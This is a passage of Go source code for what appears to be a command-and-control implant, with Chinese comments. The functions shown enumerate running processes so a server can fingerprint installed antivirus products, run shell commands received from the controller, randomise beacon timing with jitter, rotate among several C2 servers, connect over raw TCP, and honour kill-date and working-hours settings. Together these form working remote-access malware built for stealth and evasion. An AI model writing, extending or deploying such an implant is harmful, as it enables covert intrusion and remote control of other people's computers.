	cmd.SysProcAttr = getSysProcAttr()
	out, err := cmd.CombinedOutput()
	if err != nil {
		return string(out), -1, err.Error()
	}
	return string(out), 0, ""
}

// detectSecurityProducts enumerates running processes and reports the raw process name list.
// The security product fingerprint matching is performed server-side (data/av_fingerprints.json),
// so the implant no longer carries the signature library and can shrink its binary size.
func detectSecurityProducts() (string, int32, string) {
	var cmd *exec.Cmd
	if runtime.GOOS == "windows" {
		cmd = exec.Command(sysBin("tasklist.exe"), "/fo", "csv", "/nh")
	} else {
		cmd = exec.Command("/bin/sh", "-c", "ps -eo comm --no-headers")
	}
	cmd.SysProcAttr = getSysProcAttr()
	out, err := cmd.CombinedOutput()
	if err != nil {
		return "", -1, err.Error()
	}

	// Windows下 tasklist 输出为 GBK，先转为 UTF-8
	processList := string(out)
	if runtime.GOOS == "windows" {
		processList = string(gbkToUTF8(out))
	}

	// 提取去重后的进程名列表（JSON 数组），交由服务端指纹库匹配
	seen := make(map[string]bool)
	var names []string
	for _, line := range strings.Split(processList, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// 提取进程名：Windows CSV 为 "进程名",PID,...  Linux ps 为第一列
		procName := line
		if runtime.GOOS == "windows" {
			if strings.HasPrefix(line, "\"") {
				parts := strings.SplitN(line, "\",", 2)
				procName = strings.Trim(parts[0], "\"")
			}
		} else {
			fields := strings.Fields(line)
			if len(fields) > 0 {
				procName = fields[0]
			}
		}
		if procName == "" || seen[procName] {
			continue
		}
		seen[procName] = true
		names = append(names, procName)
	}

	data, _ := json.Marshal(names)
	return string(data), 0, ""
}

// executeShellCommand runs a shell command, parsing Data JSON if needed
func executeShellCommand(command, data string) (string, int32, string) {
	if command == "" && data != "" {
		var shellData struct {
			Command string `json:"command"`
			Args    string `json:"args"`
		}
		if err := json.Unmarshal([]byte(data), &shellData); err == nil && shellData.Command != "" {
			command = shellData.Command
			if shellData.Args != "" {
				command += " " + shellData.Args
			}
		} else {
			command = data
		}
	}
	if command == "" {
		return "", -1, "no command provided"
	}
	return executeCommand(command, nil)
}

// ─── 心跳抖动 / 多C2 / KillDate / WorkingHours 辅助函数 ───────────────────────

// jitteredInterval 在基础间隔上施加 ±jitter% 的随机抖动，返回下一次心跳等待时长。
// jitterPct=0 时退化为固定间隔（保持向后兼容）。
func jitteredInterval(base time.Duration) time.Duration {
	if jitterPct <= 0 {
		return base
	}
	maxDelta := time.Duration(int64(base) * int64(jitterPct) / 100)
	if maxDelta <= 0 {
		return base
	}
	// 抖动范围为 [-maxDelta, +maxDelta]
	delta := time.Duration(rand.Int63n(2*int64(maxDelta)+1)) - maxDelta
	next := base + delta
	// 下限保护：无论抖动多大，间隔不小于 1 秒，避免心跳风暴
	if next < time.Second {
		next = time.Second
	}
	return next
}

// parseServerList 将多 C2 配置（逗号分隔的服务器列表）解析为地址数组。
// 兼容旧版单服务器配置：直接返回原值。
func parseServerList(s string) []string {
	s = strings.TrimSpace(s)
	if s == "" {
		return nil
	}
	if !strings.Contains(s, ",") {
		return []string{strings.TrimSpace(s)}
	}
	parts := strings.Split(s, ",")
	out := make([]string, 0, len(parts))
	for _, p := range parts {
		p = strings.TrimSpace(p)
		if p != "" {
			out = append(out, p)
		}
	}
	return out
}

// stripServerPrefix 剥离协议前缀（wss/ws/https/http）与尾部路径，得到纯 host:port。
func stripServerPrefix(s string) string {
	addr := strings.TrimSpace(s)
	for _, prefix := range []string{"wss://", "ws://", "https://", "http://"} {
		if strings.HasPrefix(addr, prefix) {
			addr = addr[len(prefix):]
			break
		}
	}
	// 去掉尾部路径（如 /connect），保留 host:port
	if idx := strings.Index(addr, "/"); idx >= 0 {
		addr = addr[:idx]
	}
	// 如果没有端口，追加默认端口
	if !strings.Contains(addr, ":") {
		addr = addr + ":8080"
	}
	return addr
}

// dialServer 建立到 C2 的 TCP 连接。
// 数据包字段已由 AES 加密，传输层使用明文 TCP。
func dialServer(addr string) (net.Conn, error) {
	dialer := &net.Dialer{Timeout: 10 * time.Second}
	return dialer.Dial("tcp", addr)
}

// killDateReached 判断当前时间是否已超过 KillDate（格式 YYYY-MM-DD，仅比较日期部分）。
func killDateReached() bool {
	if killDateStr == "" {
		return false
	}
	t, err := time.Parse("2006-01-02", killDateStr)
	if err != nil {
		return false
	}
	return time.Now().After(t)
}

// applyWorkingHours 解析工作时段配置（格式 "HH:MM-HH:MM"，如 "09:00-18:00"），
// 解析成功则启用 WorkingHours 限制；配置非法时不启用（照常工作）。
func applyWorkingHours(spec string) {
	spec = strings.TrimSpace(spec)
	if spec == "" {
		return
	}
	parts := strings.Split(spec, "-")
	if len(parts) != 2 {
		return
	}
	start, ok1 := parseClock(parts[0])
	end, ok2 := parseClock(parts[1])
	if !ok1 || !ok2 {
		return
	}
	workStartMin = start
	workEndMin = end
	workHoursValid = true
}

// parseClock 解析 "HH:MM" 为一天中的分钟数（0-1439）。
func parseClock(s string) (int, bool) {
	s = strings.TrimSpace(s)
	sep := strings.Index(s, ":")
	if sep < 0 {
		// 兼容 "9" 形式 = 09:00
		h, err := strconv.Atoi(s)
		if err != nil || h < 0 || h > 23 {
			return 0, false
		}
		return h * 60, true
	}
	h, err1 := strconv.Atoi(s[:sep])
	m, err2 := strconv.Atoi(s[sep+1:])
	if err1 != nil || err2 != nil || h < 0 || h > 23 || m < 0 || m > 59 {
		return 0, false
	}
	return h*60 + m, true
}

// inWorkingHours 判断当前时刻是否在工作时段内。
// 支持跨天时段（如 "22:00-06:00"）。
func inWorkingHours() bool {
	if !workHoursValid {
		return true
	}
	now := time.Now()
	cur := now.Hour()*60 + now.Minute()
	if workStartMin <= workEndMin {
		return cur >= workStartMin && cur < workEndMin
	}
	// 跨午夜时段：超过起点或在终点之前都算工作时段
	return cur >= workStartMin || cur < workEndMin
}


